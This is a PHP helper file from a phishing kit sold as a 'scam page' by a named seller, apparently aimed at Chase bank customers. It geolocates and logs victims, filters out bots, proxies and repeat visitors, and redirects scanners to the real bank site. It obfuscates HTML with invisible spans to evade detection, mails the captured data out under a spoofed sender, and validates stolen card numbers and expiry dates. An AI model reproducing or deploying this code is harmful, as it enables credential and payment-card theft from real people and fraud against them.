<?php 

/*
▓█████ ██▓       ▒███████▓█████ ██▀███  ▒█████  
▓█   ▀▓██▒       ▒ ▒ ▒ ▄▀▓█   ▀▓██ ▒ ██▒██▒  ██▒
▒███  ▒██░       ░ ▒ ▄▀▒░▒███  ▓██ ░▄█ ▒██░  ██▒
▒▓█  ▄▒██░         ▄▀▒   ▒▓█  ▄▒██▀▀█▄ ▒██   ██░
░▒████░██████▒   ▒███████░▒████░██▓ ▒██░ ████▓▒░
░░ ▒░ ░ ▒░▓  ░   ░▒▒ ▓░▒░░░ ▒░ ░ ▒▓ ░▒▓░ ▒░▒░▒░ 
 ░ ░  ░ ░ ▒  ░   ░░▒ ▒ ░ ▒░ ░  ░ ░▒ ░ ▒░ ░ ▒ ▒░ 
   ░    ░ ░      ░ ░ ░ ░ ░  ░    ░░   ░░ ░ ░ ▒  
   ░  ░   ░  ░     ░ ░      ░  ░  ░        ░ ░  
                 ░                              
icq =>  ElZero
telegram => @Coder_seller
Site => elzeroSite.com <SOON> 
Thanks For Buying My Scam Page
Copyright all Reserved to El Zero
*/
function get_string_between($string, $start, $end){
    $string = ' ' . $string;
    $ini = strpos($string, $start);
    if ($ini == 0) return '';
    $ini += strlen($start);
    $len = strpos($string, $end, $ini) - $ini;
    return substr($string, $ini, $len);
}
function dataVisitor($ip){
     $ch = curl_init();

    curl_setopt($ch, CURLOPT_URL, 'http://ip-api.com/json/'.$ip.'');
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');

    curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');

    $headers = array();
    $headers[] = 'Connection: keep-alive';
    $headers[] = 'Cache-Control: max-age=0';
    $headers[] = 'Upgrade-Insecure-Requests: 1';
    $headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36';
    $headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3';
    $headers[] = 'Accept-Encoding: gzip, deflate';
    $headers[] = 'Accept-Language: ar,en-US;q=0.9,en;q=0.8,de;q=0.7';
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);

    $result = curl_exec($ch);


    $response = json_decode($result,TRUE);


    $isp = $response['isp'];
    $region = $response['regionName'];
    $countryCode = $response['countryCode'];
    $date = date("d/m/Y h:i:s A");
    return $ip."|".strtolower($countryCode)."|".$isp."|".$region."|".$date;
}
// Get Ip
function getIp(){
    $client  = @$_SERVER['HTTP_CLIENT_IP'];
    $forward = @$_SERVER['HTTP_X_FORWARDED_FOR'];
    $remote  = $_SERVER['REMOTE_ADDR'];

    if(filter_var($client, FILTER_VALIDATE_IP))
    {
        $ip = $client;
    }
    elseif(filter_var($forward, FILTER_VALIDATE_IP))
    {
        $ip = $forward;
    }elseif ($remote == "::1") {
		$ch = curl_init();
		curl_setopt($ch, CURLOPT_URL, 'https://api.ipify.org/?format=json');
		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
		curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
		$result = curl_exec($ch);
		$splitor = explode(':', $result);
		$result = $splitor[1];
		$result = str_replace('"', "", $result);
		$result = str_replace('}', "", $result);
		$ip = $result;

    }
    else
    {
        $ip = $remote;
    }

    return $ip;
}
function ISP($ip){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, 'http://ip-api.com/json/'.$ip.'');
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
	curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
	$headers = array();
	$headers[] = 'Connection: keep-alive';
	$headers[] = 'Cache-Control: max-age=0';
	$headers[] = 'Upgrade-Insecure-Requests: 1';
	$headers[] = 'User-Agent: Mozilla/5.0 (Windows NT 6.3) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/76.0.3809.100 Safari/537.36';
	$headers[] = 'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3';
	$headers[] = 'Accept-Encoding: gzip, deflate';
	$headers[] = 'Accept-Language: ar,en-US;q=0.9,en;q=0.8,de;q=0.7';
	curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
	$result = curl_exec($ch);
	$js = json_decode($result,TRUE);
	$isp = $js['isp'];
	return $isp;
}
// Get Browser
function getBrowser(){
	$browser="Unknown Browser";
	$all=array('/msie/i'=>'Internet Explorer','/firefox/i'=>'Firefox','/safari/i'=>'Safari','/chrome/i'=>'Chrome','/edge/i'=>'Edge','/opera/i'=>'Opera','/netscape/i'=>'Netscape','/maxthon/i'=>'Maxthon','/konqueror/i'=>'Konqueror','/mobile/i'=>'Handheld Browser');
	foreach($all as $regex=>$value){
		if(preg_match($regex,$_SERVER['HTTP_USER_AGENT'])){
			$browser=$value;
		}
	}
	return $browser;
}
// Check if ip proxy or not
// Return true => Good
function checkProxy ($ip){
	$ch = curl_init();
	curl_setopt($ch, CURLOPT_URL, "https://blackbox.ipinfo.app/lookup/$ip");
	curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
	curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
	curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
	$result = curl_exec($ch);

	if ($result = "y") {
		return false;
	}else{
		return true;
	}
}
// Country Lock
function countryLock($userData, $countryLock){
	if ($userData == $countryLock) {
		return true;
	}else{
		return false;
	}
}
// Get Data From Ip
function GetData(){
    $url = "http://www.geoplugin.net/json.gp?ip=".getIp();
    $ch = curl_init();  
    curl_setopt($ch,CURLOPT_URL,$url);
    curl_setopt($ch,CURLOPT_RETURNTRANSFER,true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    $resp=curl_exec($ch);
    curl_close($ch);
    $details = json_decode($resp, true);
    //return $resp;
    $countrycode = $details['geoplugin_countryCode'];
    $country     = $details['geoplugin_countryName'];
    $currency    = $details['geoplugin_currencyCode'];
    $city        = $details['geoplugin_city'];
    $data = array('Country_code' => $countrycode, 'country' => $country , 'Currency' => $currency,'city' => $city  );
    return $data;
}
// Know Redirect From Where
// Return true => Good
function checkRedirect($redirect){	
	if (isset($_SERVER['HTTP_REFERER'])) {
		if (strpos($_SERVER['HTTP_REFERER'], $redirect) ) {
			return true;
		}else{
			return false;
		}
	}
}

// Check If Email Insert Scam Page Before or not
// Return true => Good
function accessOneTime($userEmail){
	// $userEmail = $_GET['email'];
	$text = file_get_contents("priv/emails.txt");
	$emailArray = explode("\n", $text);
	if (in_array($userEmail, $emailArray)) {
		return false;
	}else{
		return true;

	}
}
// Return true => Good
function accessOneTimeIP($ip){
	$text = file_get_contents("priv/ip.txt");
	$ipArray = explode("\n", $text);
	if (in_array($ip, $ipArray)) {
		return false;
	}else{
		return true;
	}
}

// Check Email From My List
// Return true => Good
function CheckEmail($userEmail){
	$text = file_get_contents("priv/emailList.txt");
	$emailArray = explode("\n", $text);
	// var_dump($emailArray);
	if (in_array($userEmail, $emailArray)) {
		return true;
	}else{
		return false;
		
	}
}
// Send Msg To Email With Headers
function send($to,$subject,$message){
	global $YourName;
    $headers = "MIME-Version: 1.0" . "\r\n";
    $headers .= "From: ".$YourName." <ElZero@xSniper.com>" . "\r\n";
    $headers .= "Content-type:text/plain;charset=UTF-8\r\n";
	mail($to, $subject, $message,$headers);
}
// Random Url redirect
function redirectBot(){
	return ("https://href.li/?https://chase.com");
}

function encript($str){
	global $encrypt_html ;
	if ($encrypt_html == "true"){
     	echo "<span style='float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;'>". md5(time().rand(100,999999))." </span>".$str. "<span style='float:right;font-size:.001px;color:transparent;display:inline-block;width:0px;'>". md5(time().rand(100,999999))." </span>". "<!--<span>". md5(time().rand(100,999999))."</span>-->";
	}else{
		echo $str;
	}
}

function bs2EmailGrabber($str){
    $str = str_replace("=?UTF-8?B?", "", $str);
    $str = str_replace("?=", "", $str);
    if (base64_encode(base64_decode($str)) === $str) {
        return base64_decode($str);
    }else{
        return $str;    
    }
}


function badWord($str){
	if (strpos($str,"fuck") !== false or strpos($str,"123") !== false or strpos($str,"321") !== false or strpos($str,"hack") !== false or strpos($str,"spam") !== false or strpos($str,"mother") !== false or strpos($str,"bad") !== false or strpos($str,"hello") !==false	or strpos($str,"test") !== false or strpos($str,"lol") !== false ) {
		return false;
	}else{
		return true;
	}
}

function check_cc($cc, $extra_check = false){
    $cards = array(
        "visa" => "(4\d{12}(?:\d{3})?)",
        "amex" => "(3[47]\d{13})",
        "jcb" => "(35[2-8][89]\d\d\d{10})",
        "maestro" => "((?:5020|5038|6304|6579|6761)\d{12}(?:\d\d)?)",
        "solo" => "((?:6334|6767)\d{12}(?:\d\d)?\d?)",
        "mastercard" => "(5[1-5]\d{14})",
        "switch" => "(?:(?:(?:4903|4905|4911|4936|6333|6759)\d{12})|(?:(?:564182|633110)\d{10})(\d\d)?\d?)",
    );
    $names = array("Visa", "American Express", "JCB", "Maestro", "Solo", "Mastercard", "Switch");
    $matches = array();
    $pattern = "#^(?:".implode("|", $cards).")$#";
    $result = preg_match($pattern, str_replace(" ", "", $cc), $matches);
    if($extra_check && $result > 0){
        $result = (validatecard($cc))?1:0;
    }
    return ($result>0)?$names[sizeof($matches)-2]:false;
}
function get4Digit($ccNum){
    return str_replace(range(0,9), "*", substr($ccNum, 0, -4)) .  substr($ccNum, -4);
}

function checkExpDate($date){
	$year = date("Y");
	$year = substr($year, -2);
	$month = date("m");
	$thisYear = "$month/$year";
	$explodeDate = explode('/', $date);
	$monthDate = $explodeDate[0];
	$yearhDate = $explodeDate[1];
	if ($monthDate < $month &&  $yearhDate > $year ) {
		return $date;
	}else{
		if ($thisYear >= $date ) {
	    return false;
		}else{
		    return $date;
		}
	}
}